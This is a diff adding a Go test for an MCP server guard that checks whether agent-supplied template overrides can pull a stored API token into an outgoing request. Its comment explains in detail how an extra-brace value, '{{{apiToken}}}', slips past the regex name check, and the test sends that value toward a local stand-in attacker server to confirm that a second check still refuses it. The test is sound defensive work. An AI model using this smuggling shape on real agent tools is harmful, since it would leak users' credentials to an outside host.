@@ -788,6 +788,74 @@ func TestMCPRunRequestRefusesAnOverrideResolvingToACredentialItNeverNames(t *tes
 	}
 }
 
+// CONFIRMED-SAFE / COVERAGE-ADDED. mcpTemplatePattern
+// (`\{\{\s*([^}]+?)\s*\}\}`, mcp_guard.go) is a regex, and a regex has corner
+// cases a hand-rolled interpolator's own scan does not have to share.
+// {{{apiToken}}} — one brace too many on each side — is exactly such a case:
+// Go's regexp finds ITS leftmost match starting at the OUTER "{{", captures
+// "{apiToken" (with the stray inner brace glued onto the front of the name),
+// and that string is not in secretsInScope, so
+// mcpSecretsReachedByTemplate's NAME WALK reports zero secrets reached.
+//
+// interp.Interpolate does not share that reading: its own scan tries the
+// FIRST "{{" it can find a matching key for, which is the INNER pair, and
+// {{{apiToken}}} resolves to "{" + secretValue + "}" — the real credential,
+// merely wrapped in a stray brace on each side. So the name-walk (the first
+// of mcpRefuseSecretInjectingValues' two checks) is provably fooled by this
+// shape, and the only thing standing between it and a leak is the SECOND
+// check: mcpContainsKnownSecretValue, run against the value ACTUALLY
+// interpolated. This test is the adversarial proof that the second check
+// really does catch what the first one misses — the "belt and braces"
+// comment on mcp_guard.go's header, measured rather than asserted.
+func TestMCPRunRequestExtraBraceTemplateDefeatsTheNameWalkButTheValueBackstopStillCatchesIt(t *testing.T) {
+	f := newMCPRunFixture(t)
+	f.app.mcpApprovalEmit = nil
+
+	var attackerSawAuth string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerSawAuth = r.Header.Get("Authorization")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	// THE DESTINATION IS THE REQUEST'S OWN, ALREADY IN BASE — not an
+	// override-retargeted host. That is deliberate: it isolates the
+	// mechanism under test. If the destination were also agent-retargeted
+	// (as in the sibling tests above), a mutation that broke only the value
+	// backstop would still be caught by the UNRELATED destination checkpoint,
+	// and this test would not actually be measuring the backstop at all.
+	f.app.mu.Lock()
+	collection := &f.app.state.Workspaces[0].Collections[0]
+	victim := types.NewRequestItem("Extra-brace smuggle victim", "http", len(collection.Items)+1)
+	victim.Method = "GET"
+	victim.URL = attacker.URL + "/x"
+	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
+	victim.Body = types.RequestBody{Mode: "none"}
+	collection.Items = append(collection.Items, victim)
+	victimID := victim.ID
+	f.app.mu.Unlock()
+
+	_, err := f.run(context.Background(), victimID, map[string]string{
+		// One extra "{" and "}" on each side of the real reference.
+		"smuggle": "{{{apiToken}}}",
+	})
+	if err == nil {
+		t.Fatal("an extra-brace override that resolves to the real secret value was allowed to run")
+	}
+	if !errors.Is(err, mcpserver.ErrDenied) {
+		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
+	}
+	if !strings.Contains(err.Error(), `"smuggle"`) {
+		t.Errorf("the refusal should name the offending override: %v", err)
+	}
+	if strings.Contains(err.Error(), runSentinelToken) {
+		t.Errorf("the refusal quoted the secret VALUE: %v", err)
+	}
+	if attackerSawAuth != "" {
+		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
+	}
+}
+
 // THE OTHER HALF, and the one that makes the refusal above a boundary rather
 // than a ban on braces. An override whose value is an ordinary template over
 // ordinary variables — {"path": "/{{version}}/users"} — is exactly what the
